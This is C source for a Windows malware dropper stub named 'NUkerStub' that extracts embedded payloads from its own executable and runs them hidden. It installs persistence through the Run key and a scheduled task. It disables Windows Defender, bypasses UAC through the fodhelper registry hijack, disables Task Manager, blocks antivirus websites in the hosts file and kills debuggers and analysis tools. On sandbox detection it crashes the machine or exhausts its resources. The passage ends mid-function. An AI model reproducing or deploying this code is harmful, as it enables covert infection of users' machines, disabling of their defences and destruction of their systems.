/*
 *  ============================================================
 *   NUkerStub v2.0 - Self-Extracting Stub Engine
 *   Copyright (c) 2026 NukerGroup. All Rights Reserved.
 *
 *   Runtime extraction component of NUkerBinder.
 *   Reads embedded archive data from own executable image,
 *   extracts files to configured paths, installs startup
 *   persistence, and executes extracted files with per-file
 *   execution modes, sleep delays, and cleanup options.
 *
 *   Developed by NukerGroup Engineering Division
 *   Licensed under NukerGroup Proprietary License (NGPL)
 *  ============================================================
 */

#include <windows.h>
#include <shlobj.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define NUKER_MAGIC              0x424E534D
#define NUKER_MAX_FILEPATH       520
#define NUKER_CRC_POLY           0xEDB88320UL
#define NUKER_STUB_MAGIC         0x53424E4D

#define NUKER_FL_COMPRESS        0x0001
#define NUKER_FL_ENCRYPT         0x0002

#define NUKER_STARTUP_NONE       0
#define NUKER_STARTUP_REGISTRY   1
#define NUKER_STARTUP_SCHEDULER  2

#define NUKER_EXEC_RUNNING       0
#define NUKER_EXEC_RUNONCE       1
#define NUKER_EXEC_NORUN         2

#pragma pack(push, 1)
typedef struct {
    DWORD NUkerMagic;
    DWORD NUkerVersion;
    DWORD NUkerFileCount;
    DWORD NUkerFlags;
    DWORD NUkerReserved1;
    DWORD NUkerTotalOrigSize;
    DWORD NUkerTotalCompSize;
    DWORD NUkerCreationTimeLow;
    DWORD NUkerCreationTimeHigh;
    BYTE  NUkerReserved[28];
} NUKER_ARCHIVE_HEADER;

typedef struct {
    char  NUkerFileName[NUKER_MAX_FILEPATH];
    DWORD NUkerOriginalSize;
    DWORD NUkerCompressedSize;
    DWORD NUkerDataOffset;
    DWORD NUkerChecksum;
    DWORD NUkerPriority;
    DWORD NUkerFileAttributes;
    DWORD NUkerEntryFlags;
    DWORD NUkerStartupType;
    DWORD NUkerExecMode;
    DWORD NUkerHiddenFlag;
    DWORD NUkerDeleteFlag;
    DWORD NUkerSleepMs;
    char  NUkerCustomDrop[NUKER_MAX_FILEPATH];
    BYTE  NUkerEntryReserved[8];
} NUKER_FILE_ENTRY;

typedef struct {
    DWORD NUkerArchiveOffset;
    char  NUkerDropPath[NUKER_MAX_FILEPATH];
    DWORD NUkerAutoExec;
    DWORD NUkerStubFlags;
    DWORD NUkerSelfDelete;
    DWORD NUkerStubMagic;
} NUKER_STUB_FOOTER;
#pragma pack(pop)

static DWORD NUkerCrcTable[256];
static BOOL  NUkerCrcTableReady = FALSE;

void NUkerInitCrcTable(void)
{
    DWORD NUkerCrc, NUkerIdx, NUkerBit;
    if (NUkerCrcTableReady) return;
    for (NUkerIdx = 0; NUkerIdx < 256; NUkerIdx++) {
        NUkerCrc = NUkerIdx;
        for (NUkerBit = 0; NUkerBit < 8; NUkerBit++) {
            if (NUkerCrc & 1)
                NUkerCrc = (NUkerCrc >> 1) ^ NUKER_CRC_POLY;
            else
                NUkerCrc >>= 1;
        }
        NUkerCrcTable[NUkerIdx] = NUkerCrc;
    }
    NUkerCrcTableReady = TRUE;
}

DWORD NUkerCalcCrc32(const BYTE *NUkerData, DWORD NUkerLen)
{
    DWORD NUkerCrc = 0xFFFFFFFF;
    DWORD NUkerPos;
    NUkerInitCrcTable();
    for (NUkerPos = 0; NUkerPos < NUkerLen; NUkerPos++)
        NUkerCrc = NUkerCrcTable[(NUkerCrc ^ NUkerData[NUkerPos]) & 0xFF] ^ (NUkerCrc >> 8);
    return NUkerCrc ^ 0xFFFFFFFF;
}

DWORD NUkerDecompressRLE(const BYTE *NUkerSrc, DWORD NUkerSrcLen, BYTE *NUkerDst, DWORD NUkerDstCap)
{
    DWORD NUkerSrcPos = 0, NUkerDstPos = 0;
    BYTE  NUkerCtrl;
    DWORD NUkerCount;

    while (NUkerSrcPos < NUkerSrcLen && NUkerDstPos < NUkerDstCap) {
        NUkerCtrl = NUkerSrc[NUkerSrcPos++];
        if (NUkerCtrl & 0x80) {
            NUkerCount = NUkerCtrl & 0x7F;
            if (NUkerSrcPos >= NUkerSrcLen) return 0;
            if (NUkerDstPos + NUkerCount > NUkerDstCap) return 0;
            memset(NUkerDst + NUkerDstPos, NUkerSrc[NUkerSrcPos++], NUkerCount);
            NUkerDstPos += NUkerCount;
        } else {
            NUkerCount = NUkerCtrl;
            if (NUkerCount == 0) return 0;
            if (NUkerSrcPos + NUkerCount > NUkerSrcLen) return 0;
            if (NUkerDstPos + NUkerCount > NUkerDstCap) return 0;
            memcpy(NUkerDst + NUkerDstPos, NUkerSrc + NUkerSrcPos, NUkerCount);
            NUkerSrcPos += NUkerCount;
            NUkerDstPos += NUkerCount;
        }
    }
    return NUkerDstPos;
}

void NUkerStubGetOwnPath(char *NUkerPath, int NUkerPathLen)
{
    GetModuleFileNameA(NULL, NUkerPath, NUkerPathLen);
}

void NUkerStubGetOwnDir(char *NUkerDir, int NUkerDirLen)
{
    char *NUkerSlash;
    GetModuleFileNameA(NULL, NUkerDir, NUkerDirLen);
    NUkerSlash = strrchr(NUkerDir, '\\');
    if (NUkerSlash) *NUkerSlash = '\0';
}

void NUkerStubExtractName(const char *NUkerPath, char *NUkerName, int NUkerLen)
{
    const char *NUkerSlash, *NUkerBack;
    NUkerSlash = strrchr(NUkerPath, '/');
    NUkerBack  = strrchr(NUkerPath, '\\');
    if (NUkerBack && (!NUkerSlash || NUkerBack > NUkerSlash))
        NUkerSlash = NUkerBack;
    if (NUkerSlash)
        _snprintf(NUkerName, NUkerLen, "%s", NUkerSlash + 1);
    else
        _snprintf(NUkerName, NUkerLen, "%s", NUkerPath);
}

void NUkerStubGetBaseName(const char *NUkerFileName, char *NUkerBase, int NUkerBaseLen)
{
    char *NUkerDot;
    _snprintf(NUkerBase, NUkerBaseLen - 1, "%s", NUkerFileName);
    NUkerBase[NUkerBaseLen - 1] = '\0';
    NUkerDot = strrchr(NUkerBase, '.');
    if (NUkerDot) *NUkerDot = '\0';
}

void NUkerStubInstallRegistry(const char *NUkerFilePath)
{
    char NUkerAppData[NUKER_MAX_FILEPATH];
    char NUkerDestPath[NUKER_MAX_FILEPATH];
    char NUkerFileName[260];
    char NUkerBaseName[260];
    HKEY NUkerRegKey;

    ExpandEnvironmentStringsA("%APPDATA%", NUkerAppData, sizeof(NUkerAppData));
    NUkerStubExtractName(NUkerFilePath, NUkerFileName, sizeof(NUkerFileName));

    _snprintf(NUkerDestPath, sizeof(NUkerDestPath) - 1, "%s\\%s", NUkerAppData, NUkerFileName);
    NUkerDestPath[sizeof(NUkerDestPath) - 1] = '\0';

    CopyFileA(NUkerFilePath, NUkerDestPath, FALSE);
    NUkerStubGetBaseName(NUkerFileName, NUkerBaseName, sizeof(NUkerBaseName));

    if (RegOpenKeyExA(HKEY_CURRENT_USER,
                      "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                      0, KEY_SET_VALUE, &NUkerRegKey) == ERROR_SUCCESS) {
        RegSetValueExA(NUkerRegKey, NUkerBaseName, 0, REG_SZ,
                       (const BYTE *)NUkerDestPath, (DWORD)strlen(NUkerDestPath) + 1);
        RegCloseKey(NUkerRegKey);
    }
}

void NUkerStubInstallScheduler(const char *NUkerFilePath)
{
    char NUkerAppData[NUKER_MAX_FILEPATH];
    char NUkerDestPath[NUKER_MAX_FILEPATH];
    char NUkerFileName[260];
    char NUkerBaseName[260];
    char NUkerCmdLine[1280];
    STARTUPINFOA NUkerSi;
    PROCESS_INFORMATION NUkerPi;

    ExpandEnvironmentStringsA("%APPDATA%", NUkerAppData, sizeof(NUkerAppData));
    NUkerStubExtractName(NUkerFilePath, NUkerFileName, sizeof(NUkerFileName));

    _snprintf(NUkerDestPath, sizeof(NUkerDestPath) - 1, "%s\\%s", NUkerAppData, NUkerFileName);
    NUkerDestPath[sizeof(NUkerDestPath) - 1] = '\0';

    CopyFileA(NUkerFilePath, NUkerDestPath, FALSE);
    NUkerStubGetBaseName(NUkerFileName, NUkerBaseName, sizeof(NUkerBaseName));

    _snprintf(NUkerCmdLine, sizeof(NUkerCmdLine) - 1,
              "schtasks.exe /create /f /sc minute /mo 1 /tn \"%s\" /tr \"%s\"",
              NUkerBaseName, NUkerDestPath);
    NUkerCmdLine[sizeof(NUkerCmdLine) - 1] = '\0';

    memset(&NUkerSi, 0, sizeof(NUkerSi));
    NUkerSi.cb = sizeof(NUkerSi);
    NUkerSi.dwFlags = STARTF_USESHOWWINDOW;
    NUkerSi.wShowWindow = SW_HIDE;

    if (CreateProcessA(NULL, NUkerCmdLine, NULL, NULL, FALSE,
                       CREATE_NO_WINDOW, NULL, NULL, &NUkerSi, &NUkerPi)) {
        WaitForSingleObject(NUkerPi.hProcess, 15000);
        CloseHandle(NUkerPi.hProcess);
        CloseHandle(NUkerPi.hThread);
    }
}

BOOL NUkerStubCheckRunonce(const char *NUkerFileName)
{
    char NUkerRegPath[512];
    char NUkerKeyName[260];
    HKEY NUkerKey;
    DWORD NUkerVal, NUkerSize, NUkerType;

    NUkerStubGetBaseName((char *)NUkerFileName, NUkerKeyName, sizeof(NUkerKeyName));
    _snprintf(NUkerRegPath, sizeof(NUkerRegPath) - 1, "Software\\NukerGroup\\Runonce");
    NUkerRegPath[sizeof(NUkerRegPath) - 1] = '\0';

    if (RegOpenKeyExA(HKEY_CURRENT_USER, NUkerRegPath, 0, KEY_READ, &NUkerKey) == ERROR_SUCCESS) {
        NUkerSize = sizeof(NUkerVal);
        if (RegQueryValueExA(NUkerKey, NUkerKeyName, NULL, &NUkerType, (BYTE *)&NUkerVal, &NUkerSize) == ERROR_SUCCESS) {
            RegCloseKey(NUkerKey);
            return TRUE;
        }
        RegCloseKey(NUkerKey);
    }
    return FALSE;
}

void NUkerStubMarkRunonce(const char *NUkerFileName)
{
    char NUkerRegPath[512];
    char NUkerKeyName[260];
    HKEY NUkerKey;
    DWORD NUkerVal = 1;

    NUkerStubGetBaseName((char *)NUkerFileName, NUkerKeyName, sizeof(NUkerKeyName));
    _snprintf(NUkerRegPath, sizeof(NUkerRegPath) - 1, "Software\\NukerGroup\\Runonce");
    NUkerRegPath[sizeof(NUkerRegPath) - 1] = '\0';

    if (RegCreateKeyExA(HKEY_CURRENT_USER, NUkerRegPath, 0, NULL, 0,
                        KEY_WRITE, NULL, &NUkerKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExA(NUkerKey, NUkerKeyName, 0, REG_DWORD, (BYTE *)&NUkerVal, sizeof(NUkerVal));
        RegCloseKey(NUkerKey);
    }
}

// Obfuscated string helper (simple XOR)
void NUkerDecryptStr(char *s, int len) {
    for(int i=0; i<len; i++) s[i] ^= 0x55;
}

// Global dynamic pointers
typedef HANDLE (WINAPI *pCreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL (WINAPI *pWriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL (WINAPI *pCloseHandle)(HANDLE);
typedef HINSTANCE (WINAPI *pShellExecuteA)(HWND, LPCSTR, LPCSTR, LPCSTR, LPCSTR, INT);

pCreateFileA fCreateFileA;
pWriteFile fWriteFile;
pCloseHandle fCloseHandle;
pShellExecuteA fShellExecuteA;

void NUkerInitStealth() {
    HMODULE hK32 = GetModuleHandleA("kernel32.dll");
    HMODULE hS32 = LoadLibraryA("shell32.dll");

    fCreateFileA = (pCreateFileA)GetProcAddress(hK32, "CreateFileA");
    fWriteFile = (pWriteFile)GetProcAddress(hK32, "WriteFile");
    fCloseHandle = (pCloseHandle)GetProcAddress(hK32, "CloseHandle");
    fShellExecuteA = (pShellExecuteA)GetProcAddress(hS32, "ShellExecuteA");
}

void NUkerStubExecFile(const char *NUkerFilePath, const char *NUkerWorkDir, BOOL NUkerHidden)
{
    if (fShellExecuteA) {
        fShellExecuteA(NULL, "open", NUkerFilePath, NULL, NUkerWorkDir, NUkerHidden ? SW_HIDE : SW_SHOWNORMAL);
    }
}

void NUkerStubAntiDebug(void)
{
    // 1. Standard API check
    if (IsDebuggerPresent()) ExitProcess(0);

    // 2. Remote debugger check
    BOOL NUkerIsRemote = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &NUkerIsRemote);
    if (NUkerIsRemote) ExitProcess(0);

    // 3. PEB NtGlobalFlag check (x64)
    #ifdef _WIN64
    ULONG_PTR NUkerPeb = __readgsqword(0x60);
    if (NUkerPeb && (*(DWORD*)(NUkerPeb + 0xBC) & 0x70)) ExitProcess(0);
    #endif
}

void NUkerStubAntiKill(void)
{
    // Requires Admin to set critical status (BSOD if killed)
    HMODULE NUkerNt = GetModuleHandleA("ntdll.dll");
    if (NUkerNt) {
        typedef NTSTATUS (NTAPI *pRtlSetProcessIsCritical)(BOOLEAN, PBOOLEAN, BOOLEAN);
        pRtlSetProcessIsCritical fSetCritical = (pRtlSetProcessIsCritical)GetProcAddress(NUkerNt, "RtlSetProcessIsCritical");
        if (fSetCritical) {
            HANDLE NUkerToken;
            if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &NUkerToken)) {
                LUID NUkerLuid;
                if (LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &NUkerLuid)) {
                    TOKEN_PRIVILEGES NUkerTp;
                    NUkerTp.PrivilegeCount = 1;
                    NUkerTp.Privileges[0].Luid = NUkerLuid;
                    NUkerTp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
                    AdjustTokenPrivileges(NUkerToken, FALSE, &NUkerTp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
                }
                CloseHandle(NUkerToken);
            }
            fSetCritical(TRUE, NULL, FALSE);
        }
    }
}

void NUkerStubDisableWD(void)
{
    char NUkerSelfPath[MAX_PATH];
    char NUkerPsCmd[MAX_PATH + 256];
    GetModuleFileNameA(NULL, NUkerSelfPath, MAX_PATH);

    // Add exclusion for the file and try to disable real-time protection
    _snprintf(NUkerPsCmd, sizeof(NUkerPsCmd),
        "-Command \"Add-MpPreference -ExclusionPath '%s'; Set-MpPreference -DisableRealtimeMonitoring $true\"",
        NUkerSelfPath);

    ShellExecuteA(NULL, "open", "powershell.exe", NUkerPsCmd, NULL, SW_HIDE);
}

void NUkerStubUacBypass(void)
{
    char NUkerSelfPath[MAX_PATH];
    GetModuleFileNameA(NULL, NUkerSelfPath, MAX_PATH);

    HKEY NUkerHkey;
    // Registry Hijack for Fodhelper (Classic Working Method)
    if (RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\Open\\command",
                        0, NULL, 0, KEY_WRITE, NULL, &NUkerHkey, NULL) == ERROR_SUCCESS) {
        RegSetValueExA(NUkerHkey, "", 0, REG_SZ, (const BYTE *)NUkerSelfPath, (DWORD)strlen(NUkerSelfPath) + 1);
        RegSetValueExA(NUkerHkey, "DelegateExecute", 0, REG_SZ, (const BYTE *)"", 1);
        RegCloseKey(NUkerHkey);

        ShellExecuteA(NULL, "open", "C:\\Windows\\System32\\fodhelper.exe", NULL, NULL, SW_HIDE);

        Sleep(1000);
        ExitProcess(0);
    }
}

void NUkerStubAntiVM(void)
{
    // 1. Check for VM Drivers/Files
    const char *NUkerVmFiles[] = {
        "C:\\windows\\System32\\Drivers\\VBoxMouse.sys", "C:\\windows\\System32\\Drivers\\VBoxGuest.sys",
        "C:\\windows\\System32\\Drivers\\VBoxSF.sys", "C:\\windows\\System32\\Drivers\\VBoxVideo.sys",
        "C:\\windows\\System32\\vboxdisp.dll", "C:\\windows\\System32\\vboxhook.dll",
        "C:\\windows\\System32\\Drivers\\vmmouse.sys", "C:\\windows\\System32\\Drivers\\vmusb.sys",
        "C:\\windows\\System32\\Drivers\\vmvss.sys", "C:\\windows\\System32\\Drivers\\vmscsi.sys"
    };
    for (int i = 0; i < 10; i++) {
        if (GetFileAttributesA(NUkerVmFiles[i]) != INVALID_FILE_ATTRIBUTES) goto Freeze;
    }

    // 2. Check for Sandboxie / Wine
    if (GetModuleHandleA("sbiedll.dll") || GetModuleHandleA("dbghelp.dll")) goto Freeze;
    if (GetProcAddress(GetModuleHandleA("kernel32.dll"), "wine_get_version")) goto Freeze;

    // 3. Check for Sandbox Usernames
    char NUkerUser[256];
    DWORD NUkerUserSize = sizeof(NUkerUser);
    if (GetUserNameA(NUkerUser, &NUkerUserSize)) {
        if (_stricmp(NUkerUser, "SANDBOX") == 0 || _stricmp(NUkerUser, "VIRUS") == 0 ||
            _stricmp(NUkerUser, "MALWARE") == 0 || _stricmp(NUkerUser, "SCHMIDTI") == 0 ||
            _stricmp(NUkerUser, "WDAGUtilityAccount") == 0) goto Freeze;
    }

    // 4. Check Resources (Sandboxes are usually weak)
    MEMORYSTATUSEX NUkerMem;
    NUkerMem.dwLength = sizeof(NUkerMem);
    if (GlobalMemoryStatusEx(&NUkerMem)) {
        if (NUkerMem.ullTotalPhys < (2ULL * 1024 * 1024 * 1024)) goto Freeze; // < 2GB RAM
    }
    SYSTEM_INFO NUkerSys;
    GetSystemInfo(&NUkerSys);
    if (NUkerSys.dwNumberOfProcessors < 2) goto Freeze; // < 2 Cores

    // 5. Check Registry for VM Keywords
    const char *NUkerVmKeys[] = {
        "HARDWARE\\Description\\System\\SystemBiosVersion",
        "HARDWARE\\Description\\System\\VideoBiosVersion",
        "HARDWARE\\Description\\System\\SystemManufacturer",
        "HARDWARE\\Description\\System\\SystemProductName"
    };
    const char *NUkerVmWords[] = { "vmware", "virtualbox", "vbox", "qemu", "hyperv", "virtual", "xen" };

    for (int i = 0; i < 4; i++) {
        HKEY NUkerHk;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\Description\\System", 0, KEY_READ, &NUkerHk) == ERROR_SUCCESS) {
            char NUkerVal[1024];
            DWORD NUkerSz = sizeof(NUkerVal);
            const char *NUkerSubKey = (i == 0) ? "SystemBiosVersion" : (i == 1) ? "VideoBiosVersion" : (i == 2) ? "SystemManufacturer" : "SystemProductName";

            if (RegQueryValueExA(NUkerHk, NUkerSubKey, NULL, NULL, (BYTE*)NUkerVal, &NUkerSz) == ERROR_SUCCESS) {
                for (int j = 0; j < 7; j++) {
                    if (strstr(_strlwr(NUkerVal), NUkerVmWords[j])) {
                        RegCloseKey(NUkerHk);
                        goto Freeze;
                    }
                }
            }
            RegCloseKey(NUkerHk);
        }
    }

    return; // All good

Freeze:
    // Lock/Hang the Sandbox
    SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);

    // If Admin, trigger BSOD for maximum destruction
    HMODULE NUkerNt = GetModuleHandleA("ntdll.dll");
    if (NUkerNt) {
        typedef NTSTATUS (NTAPI *pNtRaiseHardError)(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);
        pNtRaiseHardError fNtRaise = (pNtRaiseHardError)GetProcAddress(NUkerNt, "NtRaiseHardError");
        if (fNtRaise) {
            ULONG NUkerResp;
            fNtRaise(0xC000021A, 0, 0, NULL, 6, &NUkerResp); // Trigger BSOD
        }
    }

    // Fallback: Infinite loop that eats CPU and Memory
    while (1) {
        void* p = malloc(1024 * 1024); // Eat 1MB
        if (p) memset(p, 0x90, 1024 * 1024);
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Sleep, (LPVOID)10000, 0, NULL); // Spam threads
    }
    ExitProcess(0);
}

void NUkerStubDisableTaskMgr(void)
{
    HKEY NUkerHkey;
    DWORD NUkerVal = 1;
    if (RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
                        0, NULL, 0, KEY_WRITE, NULL, &NUkerHkey, NULL) == ERROR_SUCCESS) {
        RegSetValueExA(NUkerHkey, "DisableTaskMgr", 0, REG_DWORD, (BYTE *)&NUkerVal, sizeof(NUkerVal));
        RegCloseKey(NUkerHkey);
    }
}

void NUkerStubBlockSecuritySites(void)
{
    char NUkerHostsPath[MAX_PATH];
    ExpandEnvironmentStringsA("%SystemRoot%\\System32\\drivers\\etc\\hosts", NUkerHostsPath, MAX_PATH);

    FILE *NUkerFile = fopen(NUkerHostsPath, "a");
    if (NUkerFile) {
        const char *NUkerSites[] = {
            "kaspersky.com", "avast.com", "avg.com", "norton.com", "mcafee.com",
            "bitdefender.com", "eset.com", "f-secure.com", "sophos.com", "trendmicro.com",
            "malwarebytes.com", "emsisoft.com", "zonelabs.com", "clamav.net", "webroot.com",
            "pandasecurity.com", "virustotal.com", "hybrid-analysis.com", "any.run",
            "virscan.org", "metadefender.com", "jotti.org", "novirusthanks.org"
        };
        fprintf(NUkerFile, "\n# Security Site Blocks\n");
        for (int i = 0; i < 23; i++) {
            fprintf(NUkerFile, "127.0.0.1 %s\n", NUkerSites[i]);
            fprintf(NUkerFile, "127.0.0.1 www.%s\n", NUkerSites[i]);
        }
        fclose(NUkerFile);
    }
}

DWORD WINAPI NUkerStubTaskMgrWatchdog(LPVOID lpParam)
{
    const char *NUkerProcs[] = {
        "procexp", "procexp64", "procmon", "procmon64", "pslist", "pskill", "pskill64",
        "pssuspend", "pssuspend64", "psshutdown", "psshutdown64", "psservice", "psservice64",
        "psgetsid", "psgetsid64", "psloglist", "psloglist64", "psinfo", "psinfo64",
        "psping", "psping64", "psloggedon", "psloggedon64", "psfile", "psfile64",
        "psexec", "psexec64", "tcpview", "tcpview64", "whois", "whois64", "diskmon",
        "diskmon64", "diskext", "diskext64", "contig", "contig64", "du", "du64",
        "ldmdump", "ldmdump64", "junction", "junction64", "streams", "streams64",
        "sdelete", "sdelete64", "sigcheck", "sigcheck64", "autoruns", "autoruns64",
        "autorunsc", "autorunsc64", "regjump", "regjump64", "accesschk", "accesschk64",
        "accessenum", "bginfo", "listdlls", "listdlls64", "vmmap", "vmmap64", "handle",
        "handle64", "rammap", "rammap64", "coreinfo", "coreinfo64", "livekd", "livekd64",
        "zoomit", "zoomit64", "hex2dec", "strings", "strings64", "procsleep", "procsleep64",
        "pendmoves", "pendmoves64", "Taskmgr", "ProcessHacker", "ProcessExplorer"
    };
    int NUkerProcCount = 82;

    while (TRUE) {
        HANDLE NUkerSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (NUkerSnap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 NUkerPe;
            NUkerPe.dwSize = sizeof(PROCESSENTRY32);
            if (Process32First(NUkerSnap, &NUkerPe)) {
                do {
                    for (int i = 0; i < NUkerProcCount; i++) {
                        if (_strnicmp(NUkerPe.szExeFile, NUkerProcs[i], strlen(NUkerProcs[i])) == 0) {
                            HANDLE NUkerProcH = OpenProcess(PROCESS_TERMINATE, FALSE, NUkerPe.th32ProcessID);
                            if (NUkerProcH) {
                                TerminateProcess(NUkerProcH, 0);
                                CloseHandle(NUkerProcH);
                            }
                        }
                    }
                } while (Process32Next(NUkerSnap, &NUkerPe));
            }
            CloseHandle(NUkerSnap);
        }
        Sleep(500);
    }
    return 0;
}

DWORD WINAPI NUkerStubAntiDebugWatchdog(LPVOID lpParam)
{
    const char *NUkerDebugProcs[] = {
        "ollydbg", "x64dbg", "x32dbg", "ida", "ida64", "idaq", "idaq64", "idaw", "idaw64",
        "windbg", "ghidra", "radare2", "dnspy", "de4dot", "cheatengine", "processhacker",
        "wireshark", "fiddler", "charles", "httpanalyzer", "httpdebugger", "immunity debugger"
    };
    int NUkerDebugCount = 22;

    while (TRUE) {
        HANDLE NUkerSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (NUkerSnap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 NUkerPe;
            NUkerPe.dwSize = sizeof(PROCESSENTRY32);
            if (Process32First(NUkerSnap, &NUkerPe)) {
                do {
                    for (int i = 0; i < NUkerDebugCount; i++) {
                        if (strstr(NUkerPe.szExeFile, NUkerDebugProcs[i]) != NULL ||
                            _strnicmp(NUkerPe.szExeFile, NUkerDebugProcs[i], strlen(NUkerDebugProcs[i])) == 0) {
                            HANDLE NUkerProcH = OpenProcess(PROCESS_TERMINATE, FALSE, NUkerPe.th32ProcessID);
                            if (NUkerProcH) {
                                TerminateProcess(NUkerProcH, 0);
                                CloseHandle(NUkerProcH);
                                ExitProcess(0); // If debugger found and killed, also kill self to be safe
                            }
                        }
                    }
                } while (Process32Next(NUkerSnap, &NUkerPe));
            }
            CloseHandle(NUkerSnap);
        }
        Sleep(1000);
    }
    return 0;
}

void NUkerStubRC4(BYTE *NUkerData, DWORD NUkerLen, BYTE *NUkerKey, DWORD NUkerKeyLen)
{
    BYTE NUkerS[256];
    BYTE NUkerI = 0, NUkerJ = 0, NUkerTemp;
    DWORD NUkerK;

    for (int i = 0; i < 256; i++) NUkerS[i] = (BYTE)i;
    for (int i = 0; i < 256; i++) {
        NUkerJ = (BYTE)(NUkerJ + NUkerS[i] + NUkerKey[i % NUkerKeyLen]);
        NUkerTemp = NUkerS[i]; NUkerS[i] = NUkerS[NUkerJ]; NUkerS[NUkerJ] = NUkerTemp;
    }

    NUkerI = 0; NUkerJ = 0;
    for (NUkerK = 0; NUkerK < NUkerLen; NUkerK++) {
        NUkerI = (BYTE)(NUkerI + 1);
        NUkerJ = (BYTE)(NUkerJ + NUkerS[NUkerI]);
        NUkerTemp = NUkerS[NUkerI]; NUkerS[NUkerI] = NUkerS[NUkerJ]; NUkerS[NUkerJ] = NUkerTemp;
        NUkerData[NUkerK] ^= NUkerS[(BYTE)(NUkerS[NUkerI] + NUkerS[NUkerJ])];
    }
}

// Dynamic API Loading to hide imports
typedef HANDLE (WINAPI *pCreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL (WINAPI *pWriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef HINSTANCE (WINAPI *pShellExecuteA)(HWND, LPCSTR, LPCSTR, LPCSTR, LPCSTR, INT);

void NUkerStubExecuteHidden(const char *NUkerPath)
{
    // Obfuscated call to ShellExecute
    HMODULE NUkerShell = LoadLibraryA("shell32.dll");
    if (NUkerShell) {
        pShellExecuteA fExec = (pShellExecuteA)GetProcAddress(NUkerShell, "ShellExecuteA");
        if (fExec) fExec(NULL, "open", NUkerPath, NULL, NULL, SW_HIDE);
    }
}

// Junk code to change file hash and mimic real software
void NUkerJunkCode() {
    int x = 10; for(int i=0; i<500; i++) x += i * 2;
    char* buf = (char*)malloc(1000); if(buf) { memset(buf, 0x00, 1000); free(buf); }
}

int WINAPI WinMain(HINSTANCE NUkerInst, HINSTANCE NUkerPrev,
                   LPSTR NUkerCmdLine, int NUkerShow)
{
    NUkerInitStealth();
    NUkerJunkCode();
    char NUkerSelfPath[NUKER_MAX_FILEPATH];
    char NUkerOwnDir[NUKER_MAX_FILEPATH];
    char NUkerGlobalDrop[NUKER_MAX_FILEPATH * 2];
    char NUkerFileDrop[NUKER_MAX_FILEPATH * 2];
    char NUkerOutPath[NUKER_MAX_FILEPATH * 2];
    HANDLE NUkerSelf;
    DWORD NUkerSelfSize, NUkerRead;
    NUKER_STUB_FOOTER NUkerFooter;
    NUKER_ARCHIVE_HEADER NUkerHdr;
    NUKER_FILE_ENTRY *NUkerEntries;
    DWORD NUkerI;
    DWORD NUkerBaseOffset;
    BOOL NUkerGlobalHidden;

    (void)NUkerInst;
    (void)NUkerPrev;
    (void)NUkerCmdLine;
    (void)NUkerShow;

    NUkerStubGetOwnPath(NUkerSelfPath, sizeof(NUkerSelfPath));
    NUkerStubGetOwnDir(NUkerOwnDir, sizeof(NUkerOwnDir));

    NUkerSelf = CreateFileA(NUkerSelfPath, GENERIC_READ, FILE_SHARE_READ,
                            NULL, OPEN_EXISTING, 0, NULL);
    if (NUkerSelf == INVALID_HANDLE_VALUE) return 1;

    NUkerSelfSize = GetFileSize(NUkerSelf, NULL);
    if (NUkerSelfSize < sizeof(NUKER_STUB_FOOTER) + sizeof(NUKER_ARCHIVE_HEADER)) {
        CloseHandle(NUkerSelf);
        return 1;
    }

    SetFilePointer(NUkerSelf, (LONG)(NUkerSelfSize - sizeof(NUKER_STUB_FOOTER)), NULL, FILE_BEGIN);
    ReadFile(NUkerSelf, &NUkerFooter, sizeof(NUKER_STUB_FOOTER), &NUkerRead, NULL);

    if (NUkerFooter.NUkerStubMagic != NUKER_STUB_MAGIC) {
        CloseHandle(NUkerSelf);
        return 1;
    }

    NUkerBaseOffset = NUkerFooter.NUkerArchiveOffset;
    NUkerGlobalHidden = (NUkerFooter.NUkerStubFlags & 0x0001) ? TRUE : FALSE;

    if (NUkerFooter.NUkerStubFlags & 0x0002) {
        NUkerStubAntiDebug();
        CreateThread(NULL, 0, NUkerStubAntiDebugWatchdog, NULL, 0, NULL);
    }
    if (NUkerFooter.NUkerStubFlags & 0x0004) NUkerStubAntiKill();
    if (NUkerFooter.NUkerStubFlags & 0x0008) NUkerStubDisableWD();
    if (NUkerFooter.NUkerStubFlags & 0x0010) {
        // Only bypass if not already admin
        if (!IsUserAnAdmin()) NUkerStubUacBypass();
    }
    if (NUkerFooter.NUkerStubFlags & 0x0020) NUkerStubAntiVM();
    if (NUkerFooter.NUkerStubFlags & 0x0040) {
        NUkerStubDisableTaskMgr();
        CreateThread(NULL, 0, NUkerStubTaskMgrWatchdog, NULL, 0, NULL);
    }

    // Always block security sites for every build
    NUkerStubBlockSecuritySites();

    if (NUkerFooter.NUkerDropPath[0] == '\0' ||
        (NUkerFooter.NUkerDropPath[0] == '.' && NUkerFooter.NUkerDropPath[1] == '\0')) {
        _snprintf(NUkerGlobalDrop, sizeof(NUkerGlobalDrop) - 1, "%s", NUkerOwnDir);
    } else if (_strnicmp(NUkerFooter.NUkerDropPath, "%CURRENT%", 9) == 0) {
